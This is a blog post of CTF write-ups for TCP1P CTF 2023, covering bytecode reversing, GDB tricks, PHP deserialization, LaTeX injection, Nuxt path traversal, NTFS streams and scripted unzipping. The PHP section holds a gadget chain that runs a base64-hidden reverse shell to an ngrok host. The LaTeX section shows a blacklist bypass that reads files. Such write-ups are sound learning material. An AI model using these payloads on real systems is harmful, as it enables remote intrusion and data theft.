---
title:  "TCP1P CTF 2023 - First Step Beyond Nusantara [Quick Writeups]"
date:   2023-10-09 00:00:00
categories: [Web, Rev, Forensic, Misc]
tags: [Web, Rev, Forensic, Misc]
---

Last week, i participated in "TCP1P CTF 2023 - First Step Beyond Nusantara" with the ACTFA (Amikom CTF Affiliation) University team and managed to solve several challenges. I've written quick write-ups for all the challenges I solved.

<!--more-->

### **Take Some Byte - Reversing**
**Challenge Description:**\
`I think some code is need some effort to read`\
`Author: omegathrone`

**Analysis:**\
This assembly code assigns values to the list variable "flag" based on certain conditions.
``` text
15            0 LOAD_FAST                0 (flag)
              2 LOAD_CONST               0 (None)
              4 LOAD_CONST               1 (6)
              6 BUILD_SLICE              2
              8 BINARY_SUBSCR
             10 LOAD_CONST               2 ('TCP1P{')
             12 COMPARE_OP               3 (!=)
             14 POP_JUMP_IF_FALSE       38
             16 LOAD_FAST                0 (flag)
             18 LOAD_CONST               3 (-1)
             20 LOAD_CONST               0 (None)
             22 BUILD_SLICE              2
             24 BINARY_SUBSCR
             26 LOAD_CONST               4 ('}')
             28 COMPARE_OP               3 (!=)
             30 POP_JUMP_IF_FALSE       38

 16          32 LOAD_GLOBAL              0 (oops)
             34 CALL_FUNCTION            0
             36 POP_TOP

 18     >>   38 LOAD_FAST                0 (flag)
             40 LOAD_CONST               1 (6)
             42 LOAD_CONST               5 (10)
             44 BUILD_SLICE              2
             46 BINARY_SUBSCR
             48 LOAD_CONST               6 ('byte')
             50 COMPARE_OP               2 (==)
             52 POP_JUMP_IF_FALSE       60

 19          54 LOAD_GLOBAL              1 (yeayy)
             56 CALL_FUNCTION            0
             58 POP_TOP

 21     >>   60 LOAD_FAST                0 (flag)
             62 LOAD_CONST               5 (10)
             64 BINARY_SUBSCR
             66 POP_JUMP_IF_FALSE       98
             68 LOAD_FAST                0 (flag)
             70 LOAD_CONST               7 (15)
             72 BINARY_SUBSCR
             74 POP_JUMP_IF_FALSE       98
             76 LOAD_FAST                0 (flag)
             78 LOAD_CONST               8 (18)
             80 BINARY_SUBSCR
             82 LOAD_GLOBAL              2 (chr)
             84 LOAD_CONST               9 (95)
             86 CALL_FUNCTION            1
             88 COMPARE_OP               3 (!=)
             90 POP_JUMP_IF_FALSE       98

 22          92 LOAD_GLOBAL              0 (oops)
             94 CALL_FUNCTION            0
             96 POP_TOP

 24     >>   98 LOAD_FAST                0 (flag)
            100 LOAD_CONST              10 (11)
            102 LOAD_CONST               7 (15)
            104 BUILD_SLICE              2
            106 BINARY_SUBSCR
            108 LOAD_CONST              11 ('code')
            110 COMPARE_OP               3 (!=)
            112 POP_JUMP_IF_FALSE      120

 25         114 LOAD_GLOBAL              0 (oops)
            116 CALL_FUNCTION            0
            118 POP_TOP

 27     >>  120 LOAD_FAST                0 (flag)
            122 LOAD_CONST              10 (11)
            124 BINARY_SUBSCR
            126 LOAD_FAST                0 (flag)
            128 LOAD_CONST              12 (1)
            130 BINARY_SUBSCR
            132 LOAD_METHOD              3 (lower)
            134 CALL_METHOD              0
            136 COMPARE_OP               2 (==)
            138 POP_JUMP_IF_FALSE      146

 28         140 LOAD_GLOBAL              1 (yeayy)
            142 CALL_FUNCTION            0
            144 POP_TOP

 30     >>  146 LOAD_FAST                0 (flag)
            148 LOAD_CONST              13 (12)
            150 BINARY_SUBSCR
            152 LOAD_GLOBAL              4 (ord)
            154 LOAD_FAST                0 (flag)
            156 LOAD_CONST              14 (20)
            158 BINARY_SUBSCR
            160 CALL_FUNCTION            1
            162 LOAD_CONST               1 (6)
            164 BINARY_SUBTRACT
            166 COMPARE_OP               2 (==)
            168 POP_JUMP_IF_FALSE      176

 31         170 LOAD_GLOBAL              1 (yeayy)
            172 CALL_FUNCTION            0
            174 POP_TOP

 33     >>  176 LOAD_GLOBAL              4 (ord)
            178 LOAD_FAST                0 (flag)
            180 LOAD_CONST              15 (16)
            182 BINARY_SUBSCR
            184 CALL_FUNCTION            1
            186 LOAD_CONST              16 (105)
            188 COMPARE_OP               3 (!=)
            190 POP_JUMP_IF_FALSE      214
            192 LOAD_GLOBAL              4 (ord)
            194 LOAD_FAST                0 (flag)
            196 LOAD_CONST              17 (17)
            198 BINARY_SUBSCR
            200 CALL_FUNCTION            1
            202 LOAD_CONST              18 (115)
            204 COMPARE_OP               3 (!=)
            206 POP_JUMP_IF_FALSE      214

 34         208 LOAD_GLOBAL              0 (oops)
            210 CALL_FUNCTION            0
            212 POP_TOP

 36     >>  214 LOAD_FAST                0 (flag)
            216 LOAD_CONST              19 (19)
            218 BINARY_SUBSCR
            220 LOAD_CONST              20 ('H')
            222 COMPARE_OP               3 (!=)
            224 POP_JUMP_IF_FALSE      232

 37         226 LOAD_GLOBAL              0 (oops)
            228 CALL_FUNCTION            0
            230 POP_TOP

 39     >>  232 LOAD_GLOBAL              4 (ord)
            234 LOAD_FAST                0 (flag)
            236 LOAD_CONST              14 (20)
            238 BINARY_SUBSCR
            240 CALL_FUNCTION            1
            242 LOAD_CONST              21 (117)
            244 COMPARE_OP               2 (==)
            246 POP_JUMP_IF_FALSE      254

 40         248 LOAD_GLOBAL              1 (yeayy)
            250 CALL_FUNCTION            0
            252 POP_TOP

 42     >>  254 LOAD_GLOBAL              4 (ord)
            256 LOAD_FAST                0 (flag)
            258 LOAD_CONST              22 (21)
            260 BINARY_SUBSCR
            262 CALL_FUNCTION            1
            264 LOAD_GLOBAL              4 (ord)
            266 LOAD_FAST                0 (flag)
            268 LOAD_CONST              23 (2)
            270 BINARY_SUBSCR
            272 CALL_FUNCTION            1
            274 LOAD_CONST               5 (10)
            276 BINARY_SUBTRACT
            278 COMPARE_OP               3 (!=)
            280 EXTENDED_ARG             1
            282 POP_JUMP_IF_FALSE      290

 43         284 LOAD_GLOBAL              0 (oops)
            286 CALL_FUNCTION            0
            288 POP_TOP

 45     >>  290 LOAD_FAST                0 (flag)
            292 LOAD_CONST              24 (22)
            294 BINARY_SUBSCR
            296 LOAD_FAST                0 (flag)
            298 LOAD_CONST              25 (0)
            300 BINARY_SUBSCR
            302 LOAD_METHOD              3 (lower)
            304 CALL_METHOD              0
            306 COMPARE_OP               3 (!=)
            308 EXTENDED_ARG             1
            310 POP_JUMP_IF_FALSE      318

 46         312 LOAD_GLOBAL              0 (oops)
            314 CALL_FUNCTION            0
            316 POP_TOP

 48     >>  318 LOAD_FAST                0 (flag)
            320 LOAD_CONST              24 (22)
            322 BINARY_SUBSCR
            324 LOAD_FAST                0 (flag)
            326 LOAD_CONST              26 (23)
            328 BINARY_SUBSCR
            330 COMPARE_OP               2 (==)
            332 EXTENDED_ARG             1
            334 POP_JUMP_IF_FALSE      342

 49         336 LOAD_GLOBAL              1 (yeayy)
            338 CALL_FUNCTION            0
            340 POP_TOP
        >>  342 LOAD_CONST               0 (None)
            344 RETURN_VALUE
```
**Solver:**
``` python
flag = [x for x in range(25)]
# 15           0 LOAD_FAST                0 (flag)
#               2 LOAD_CONST               0 (None)
#               4 LOAD_CONST               1 (6)
#               6 BUILD_SLICE              2
#               8 BINARY_SUBSCR
#              10 LOAD_CONST               2 ('TCP1P{')
#              12 COMPARE_OP               3 (!=)
#              14 POP_JUMP_IF_FALSE       38

# flag[0:6] != "TCP1P{"
flag[0:6] = "TCP1P{"

         # 16 LOAD_FAST                0 (flag)
         # 18 LOAD_CONST               3 (-1)
         # 20 LOAD_CONST               0 (None)
         # 22 BUILD_SLICE              2
         # 24 BINARY_SUBSCR
         # 26 LOAD_CONST               4 ('}')
         # 28 COMPARE_OP               3 (!=)
         # 30 POP_JUMP_IF_FALSE       38

# flag[-1] != "}"
flag[-1] = "}"


# 18     >>   38 LOAD_FAST                0 (flag)
#             40 LOAD_CONST               1 (6)
#             42 LOAD_CONST               5 (10)
#             44 BUILD_SLICE              2
#             46 BINARY_SUBSCR
#             48 LOAD_CONST               6 ('byte')
#             50 COMPARE_OP               2 (==)
#             52 POP_JUMP_IF_FALSE       60

flag[6:10] = "byte"

# 21     >>   60 LOAD_FAST                0 (flag)
#            62 LOAD_CONST               5 (10)
#            64 BINARY_SUBSCR
#            66 POP_JUMP_IF_FALSE       98
#            68 LOAD_FAST                0 (flag)
#            70 LOAD_CONST               7 (15)
#            72 BINARY_SUBSCR
#            74 POP_JUMP_IF_FALSE       98
#            76 LOAD_FAST                0 (flag)
#            78 LOAD_CONST               8 (18)
#            80 BINARY_SUBSCR
#            82 LOAD_GLOBAL              2 (chr)
#            84 LOAD_CONST               9 (95)
#            86 CALL_FUNCTION            1
#            88 COMPARE_OP               3 (!=)
#            90 POP_JUMP_IF_FALSE       98

# flag[10], flag[15], flag[18] != chr(95)
flag[10], flag[15], flag[18] = chr(95)*3


# 24     >>   98 LOAD_FAST                0 (flag)
#            100 LOAD_CONST              10 (11)
#            102 LOAD_CONST               7 (15)
#            104 BUILD_SLICE              2
#            106 BINARY_SUBSCR
#            108 LOAD_CONST              11 ('code')
#            110 COMPARE_OP               3 (!=)
#            112 POP_JUMP_IF_FALSE      120

# flag[11:15] != "code"
flag[11:15] = "code"


# 27     >>  120 LOAD_FAST                0 (flag)
#           122 LOAD_CONST              10 (11)
#           124 BINARY_SUBSCR
#           126 LOAD_FAST                0 (flag)
#           128 LOAD_CONST              12 (19)
#           130 BINARY_SUBSCR
#           132 COMPARE_OP               2 (==)
#           134 POP_JUMP_IF_FALSE      142

flag[19] = flag[10]

# 30     >>  142 LOAD_FAST                0 (flag)
#          144 LOAD_CONST              13 (12)
#          146 BINARY_SUBSCR
#          148 LOAD_FAST                0 (flag)
#          150 LOAD_CONST              14 (20)
#          152 BINARY_SUBSCR
#          154 COMPARE_OP               2 (==)
#          156 POP_JUMP_IF_FALSE      164

flag[20] = flag[12]

# 33     >>  164 LOAD_GLOBAL              3 (ord)
#            166 LOAD_FAST                0 (flag)
#            168 LOAD_CONST              15 (16)
#            170 BINARY_SUBSCR
#            172 CALL_FUNCTION            1
#            174 LOAD_CONST              16 (105)
#            176 COMPARE_OP               3 (!=)
#            178 POP_JUMP_IF_FALSE      202
#            180 LOAD_GLOBAL              3 (ord)
#            182 LOAD_FAST                0 (flag)
#            184 LOAD_CONST              17 (17)
#            186 BINARY_SUBSCR
#            188 CALL_FUNCTION            1
#            190 LOAD_CONST              18 (115)
#            192 COMPARE_OP               3 (!=)
#            194 POP_JUMP_IF_FALSE      202

# ord(flag[16]) != 105 & ord(flag[17]) != 115
flag[16] = chr(105)
flag[17] = chr(115)

# 36     >>  202 LOAD_FAST                0 (flag)
#            204 LOAD_CONST              12 (19)
#            206 BINARY_SUBSCR
#            208 LOAD_CONST              19 ('H')
#            210 COMPARE_OP               3 (!=)
#            212 POP_JUMP_IF_FALSE      220

# flag[19] != "H"
flag[19] = "H"

# 39     >>  220 LOAD_GLOBAL              3 (ord)
#           222 LOAD_FAST                0 (flag)
#           224 LOAD_CONST              14 (20)
#           226 BINARY_SUBSCR
#           228 CALL_FUNCTION            1
#           230 LOAD_CONST              20 (117)
#           232 COMPARE_OP               2 (==)
#           234 POP_JUMP_IF_FALSE      242

# ord(flag[20]) == 117
flag[20] = chr(117)

# 42     >>  242 LOAD_GLOBAL              3 (ord)
#            244 LOAD_FAST                0 (flag)
#            246 LOAD_CONST              21 (21)
#            248 BINARY_SUBSCR
#            250 CALL_FUNCTION            1
#            252 LOAD_GLOBAL              3 (ord)
#            254 LOAD_FAST                0 (flag)
#            256 LOAD_CONST              22 (2)
#            258 BINARY_SUBSCR
#            260 CALL_FUNCTION            1
#            262 LOAD_CONST               5 (10)
#            264 BINARY_SUBTRACT
#            266 COMPARE_OP               3 (!=)
#            268 EXTENDED_ARG             1
#            270 POP_JUMP_IF_FALSE      278

# ord(flag[21]) != ord(flag[2]) - 10
flag[21] = chr(ord(flag[2]) - 10)

# 45     >>  278 LOAD_FAST                0 (flag)
#            280 LOAD_CONST              23 (22)
#            282 BINARY_SUBSCR
#            284 LOAD_FAST                0 (flag)
#            286 LOAD_CONST              24 (0)
#            288 BINARY_SUBSCR
#            290 LOAD_METHOD              4 (lower)
#            292 CALL_METHOD              0
#            294 COMPARE_OP               3 (!=)
#            296 EXTENDED_ARG             1
#            298 POP_JUMP_IF_FALSE      306 

# flag[22] != flag[0].lower()
flag[22] = flag[0].lower()

# 48     >>  306 LOAD_FAST                0 (flag)
#            308 LOAD_CONST              23 (22)
#            310 BINARY_SUBSCR
#            312 LOAD_FAST                0 (flag)
#            314 LOAD_CONST              25 (23)
#            316 BINARY_SUBSCR
#            318 COMPARE_OP               2 (==)
#            320 EXTENDED_ARG             1
#            322 POP_JUMP_IF_FALSE      330

flag[23] = flag[22]
print(''.join(flag))
```
Run the solver and got the flag!\
**Flag:** TCP1P{byte_code_is_HuFtt}

### **Subject Encallment - Reversing**
**Challenge Description:**\
`If there's something strange. In your neighborhood. Who you gonna call?`\
`Author: Kisanak`

**Analysis:**\
Upon decompiling using IDA Pro, it was found that the code runs the 'secretFunction' function, but there's no call to 'flag' within it. 
Let's check the other available functions. There's a 'printFlag' function that runs the 'phase1-14' functions. The 'phase1-14' functions are used for key assignments. 
The flag is then obtained through XOR operations using the keys acquired. Since the 'phase1-14' functions automatically assign the keys, you just need to call 'printFlag'. 
This can be done using the **'jump <address of the printFlag function>'** method in GDB. Before jump to printFlag, you need to set breakpoint on main function with command **'b *main'**.\
**Main Function:**
![Main Function](/images/post/TCP1PCTF2023_SubjectEncallment1.png)
**Secret Function:**
![Secret Function](/images/post/TCP1PCTF2023_SubjectEncallment2.png)
**printFlag Function:**\
![printFlag Function](/images/post/TCP1PCTF2023_SubjectEncallment3.png)
**Solver:**
![Flag](/images/post/TCP1PCTF2023_SubjectEncallment4.png)
**Flag:** TCP1P{here_my_number_so_call_me_maybe}

### **Un Secure - Web**
**Challenge Description:**\
`Do you know what "unserialize" means? In PHP, unserialize is something that can be very dangerous, you know? It can cause Remote Code Execution. And if it's combined with an autoloader like in Composer, it can use gadgets in the autoloaded folder to achieve Remote Code Execution.`
`http://ctf.tcp1p.com:45678`
`Author: Dimas`

**Analysis:**\
Given the source code, it's observed that the 'index.php' file calls the 'unserialize' function, which is a known point of deserialization vulnerability. Inside the 'src' folder, there are three files with namespaces: 'GadgetOne/Adders.php,' 'GadgetTwo/Echoers.php,' and 'GadgetThree/Vuln.php.'\
1. File 'Vuln.php': there's a '__toString()' function with 'eval' inside it.\
2. File 'Adders.php': there's a '__construct($x)' function that returns 'get_x()'.\
3. File 'Echoers.php': there's a '__destruct()' function with 'echo get_x()' inside it.

We can utilize these three gadgets to achieve Remote Code Execution (RCE). The 'Vuln' Gadget is wrapped by the 'Adders' Gadget, which, in turn, is wrapped by the 'Echoers' Gadget to trigger the '__toString()' 'eval' function in the 'Vuln' Gadget.\
**Index.php:**
``` php
<?php
require("vendor/autoload.php");

if (isset($_COOKIE['cookie'])) {
    $cookie = base64_decode($_COOKIE['cookie']);
    unserialize($cookie);
}

echo "Welcome to my web app!";
```
**GadgetOne\Adders.php:**
``` php
<?php

namespace GadgetOne {
    class Adders
    {
        private $x;
        function __construct($x)
        {
            $this->x = $x;
        }
        function get_x()
        {
            return $this->x;
        }
    }
}
```
**GadgetTwo\Echoers.php:**
``` php
<?php

namespace GadgetTwo {
    class Echoers
    {
        protected $klass;
        
        function __destruct()
        {
            echo $this->klass->get_x();
        }
    }
}
```
**GadgetThree\Vuln.php:**
``` php
<?php

namespace GadgetThree {
    class Vuln
    {
        public $waf1;
        protected $waf2;
        private $waf3;
        public $cmd;
        function __toString()
        {
            if (!($this->waf1 === 1)) {
                die("not x");
            }
            if (!($this->waf2 === "\xde\xad\xbe\xef")) {
                die("not y");
            }
            if (!($this->waf3) === false) {
                die("not z");
            }
            eval($this->cmd);
        }
    }
}
```
**Solver:**\
To gain RCE, i modify this Gadget and create exploit. I also added a function '__construct()' to the Gadget Echoers to capture parameters when the class is defined, and then turned it into a variable so that it can be used by functions within the class.\
**GadgetTwo\Echoers.php:**
``` php
<?php

namespace GadgetTwo {
    class Echoers
    {
        protected $klass;

        function __construct()
        {
            $this->klass = new \GadgetOne\Adders(new \GadgetThree\Vuln());
        }
        
        function __destruct()
        {
            echo $this->klass->get_x();
        }
    }
}
```
**GadgetThree\Vuln.php:**
``` php
<?php

namespace GadgetThree {
    class Vuln
    {
        public $waf1 = 1;
        protected $waf2 = "\xde\xad\xbe\xef";
        private $waf3 = false;
        public $cmd = 'system("echo c2ggLWkgPiYgL2Rldi90Y3AvMC50Y3AuYXAubmdyb2suaW8vMTAxMzggMD4mMQ== | base64 -d | bash");';
        function __toString()
        {
            eval($this->cmd);
        }
    }
}
```
**Exploit.php:**
```php
<?php

require 'vendor/autoload.php';

use GadgetOne\Adders;
use GadgetTwo\Echoers;
use GadgetThree\Vuln;

$echoers = new Echoers();
$serialize = base64_encode(serialize($echoers));
echo var_dump($serialize);

?>
```
Generate the serialized cookie, and set to website's cookie **cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9...**, refresh page and got RCE!.
![Flag](/images/post/TCP1PCTF2023_UnSecure1.png)
**Flag:** TCP1P{unserialize in php go brrrrrrrr ouch}

### **Latex - Web**
**Challenge Description:**\
`My first LaTeX website for my math teacher. I hope this will become the best gift for him! :)`\
`http://ctf.tcp1p.com:52132`\
`Author: Dimas`

**Analysis:**\
Latex is vulnerable to injection, but there's a blacklist of LaTeX commands like the ones below. Here, you can bypass it using \newtoks, which is used for token register. Then, you simply assign a value to that registered token. I have worked on this Latex problem before on the Hackthebox machine Topology and the UMDCTF 2023 Homework challenge. By the way, I forgot where I got this payload from, and I saved it for future needs. Respect to whoever created this payload before.\
**Main.go - Blacklisted Command:**
``` go
var (
	//go:embed static/*
	static    embed.FS
	blacklist = []string{"\\input", "include", "newread", "openin", "file", "read", "closein",
		"usepackage", "fileline", "verbatiminput", "url", "href", "text", "write",
		"newwrite", "outfile", "closeout", "immediate", "|", "write18", "includegraphics",
		"openout", "newcommand", "expandafter", "csname", "endcsname", "^^"}
)
```
**Solver:**
``` text
\documentclass{article}
\RequirePackage{verbatim}
\begin{document}
\newtoks\in
\newtoks\put
\in={in}
\put={put}

\begin{verbatim\the\in\the\put}{/flag.txt}\end{verbatim\the\in\the\put}
\end{document}
```
**Flag:** TCP1P{bypassing_latex_waf_require_some_latex_knowledge}

### **A Simple Website - Web**
**Challenge Description:**\
`It turns out that learning to make websites using NuxtJS is really fun`
`http://ctf.tcp1p.com:45681`
`Author: Daffainfo`

**Analysis:**\
In the Dockerfile, it is known that the framework uses Nuxt with version v3.0.0-rc.12, and it runs in developer mode. While browsing Nuxt dev mode, an exploit was found, as documented in this article: https://huntr.dev/bounties/4849af83-450c-435e-bc0b-71705f5be440/. According to the article, Nuxt versions <= rc12 are vulnerable to path traversal. All that's left is to perform path traversal and read the flag.
``` text
# Clone the Nuxt.js repository and switch to the desired release
RUN git clone https://github.com/nuxt/framework.git /app && \
    cd /app && \
    git checkout v3.0.0-rc.12

# Start the Nuxt.js development server
CMD ["pnpm", "run", "dev", "--host", "0.0.0.0"]
```
**Solver:**\
![Flag](/images/post/TCP1PCTF2023_ASimpleWebsite1.png)
**Flag:** TCP1P{OuTD4t3d_NuxxT_fR4m3w0RkK}

### **Hide and Split - Forensic**
**Challenge Description:**\
`Explore this disk image file, maybe you can find something hidden in it.`\
`Author: underzero`

**Analysis:**\
Given a file of an NTFS DOS/MBR boot sector, simply extract it using 7z to reveal its contents. After extracting, you'll find files named flag[0-9].txt, as well as files named flag[0-9].txt:flag[0-9]. Examine the file flag01.txt; it contains hexadecimal data, and after decoding, it appears to be a file signature from a PNG file. Since this is likely a split PNG file, the next step is to combine all the hex data and convert it into a PNG.\
![Flag Split](/images/post/TCP1PCTF2023_hideandsplit1.png)

**Solver:**\
Simply read the flag[0-9].txt:flag[0-9] file and convert to png with command **'cat *:flag* | xxd -r -p > flag.png'**.
![Flag](/images/post/TCP1PCTF2023_hideandsplit2.png)
**Flag:** TCP1P{hidden_flag_in_the_extended_attributes_fea73c5920aa8f1c}

### **zipzipzip - Misc**
**Challenge Description:**\
`unzip me pls`
`Author: botanbell`

**Analysis:**\
Because the file is named zip-25000.zip and contains a file named password.txt, it's clear that this is a zip within a zip. This means you'll need to extract 25,000 zips with different passwords. So, we need to create automation script.\

**Solver:**
``` python
import os
import subprocess

for i in range(25000, 0, -1):
    passw = subprocess.check_output(['cat', 'password.txt']).decode("utf-8").replace("\n", "")
    os.system(f"7z x zip-{i}.zip -P'{passw}' -aoa")
    os.system(f"rm -rf zip-{i}.zip")
```
**Flag:** TCP1P{1_TH1NK_U_G00D_4T_SCR1PT1N9_botanbell_1s_h3r3^_^}

### **Guess My Number - Misc**
**Challenge Description:**\
`My friend said if i can guess the right number, he will give me something. Can you help me?`
`nc ctf.tcp1p.com 7331`
`Author: rennfurukawa`

**Analysis:**\
Decompile the guess file using IDA Pro. It's known that to obtain the flag, our input must match -889275714 after addition and XOR operations. For v1, it's a random number with a given seed. So, you just need to create a program that generates the same number with the same seed, then add 1337331 to it and XOR it with -889275714. The result will be the correct input, and you'll obtain the flag.
``` c
int vuln()
{
  int v1; // [rsp+Ch] [rbp-4h]

  key = 0;
  srand(0x539u);
  v1 = rand();
  printf("Your Guess : ");
  fflush(_bss_start);
  __isoc99_scanf("%d", &key);
  if ( ((v1 + 1337331) ^ key) == -889275714 )
  {
    puts("Correct! This is your flag :");
    system("cat flag.txt");
    exit(0);
  }
  return puts("Wrong, Try again harder!");
}
```
**Solver:**
![Random Number](/images/post/TCP1PCTF2023_GuessMyNumber1.png)
![flag](/images/post/TCP1PCTF2023_GuessMyNumber2.png)
**Flag:**\
TCP1P{r4nd0m_1s_n0t_th4t_r4nd0m_r19ht?_946f38f6ee18476e7a0bff1c1ed4b23b}

Thank you for reading this article, i hope it was helpful :-D\
**Follow me on: [Linkedin], [Medium], [Github], [Youtube], [Instagram]**

[Linkedin]: https://www.linkedin.com/in/muhammad-ichwan-banua/
[Medium]: https://banua.medium.com
[Github]: https://github.com/banuaa
[Youtube]: https://www.youtube.com/@muhammad.iwn-banua
[Instagram]: https://www.instagram.com/muhammad.iwn
